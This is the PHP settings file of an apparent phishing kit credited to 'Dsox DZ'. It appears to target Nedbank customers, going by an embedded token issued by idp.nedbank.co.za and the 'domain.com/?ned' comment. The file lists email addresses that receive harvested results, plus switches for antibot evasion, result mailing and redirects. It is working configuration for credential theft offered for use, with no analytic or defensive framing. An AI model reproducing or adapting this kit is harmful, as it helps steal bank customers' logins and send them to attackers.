<?php
/*
Coded By Dsox DZ 
Contact ME

Telegram : @dsoxcoder
Icq : @dsoxcoder
Email : inbox@outlook.com

*/

// Just change  yes/no

$email = "	ikdavidgod4@gmail.com,chukuma1111@outlook.com";
$redirect = "yes";
$redirect_password = "waxned";
$antibot = "yes";
$mail_result = "yes";
$text_result = "no";
$true_login = "no";
 

$here = 'eyJndGlkIjoiMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzZXNzaW9uaWQiOiIwM2ZjOWRjYy0zNjBmLTRlZTQtOGI3Mi0zYWUyNDU4MjkzY2QiLCJncmFudF90eXBlIjoiYW5vbnltb3VzIiwidG9rZW5fdHlwZSI6IkJlYXJlciIsIm5pZHNwIjoiMjAiLCJpc3MiOiJpZHAubmVkYmFuay5jby56YSIsImF1ZCI6IjE4ZjIyMDg5LTk5ZjYtNDgyZS05MzMwLTY3YjAzZGU5M2NmMSIsImV4cCI6MTYxMTc3NDMwNSwianRpIjoiZTFaRllBcTUxZ3BpSW9HS29abEk4eVhqaU9wekNEeFAiLCJpYXQiOjE2MTE2ODc5MDUsIm5iZiI6MTYxMTY4NzkwNX0.OWsfHdCoDdXzpyAiTLPmQDVO2_NHf7rvKNHZfissl1HidainZ-KucIrYEQSgVybVwPwPPzPOhuGqaP7e7bEIsXVdcupTI0kPMYxORhHKjJxfnBzbg3Y4qbDzaAfBRtwbQyWV-APx2FvlI4oQvD3F2qvagP4OcDNiwvwVNeamrg5xbqiJee_4z8UfuwEvpwcGKTavbiIY3JMGaTu6MCa4tfzQ30EWSjGNMlZE4I4VOrsmzz02jMcKy8MJ4XUEEIEAPxO8A5N5UW8VN4ZQLb2kS3hLmsPVINUMkjIsmyN9OokokE6ob9iQBzFhddp1QRt59sVaq3AM-SvzFcwcL789CQ';


// domain.com/?ned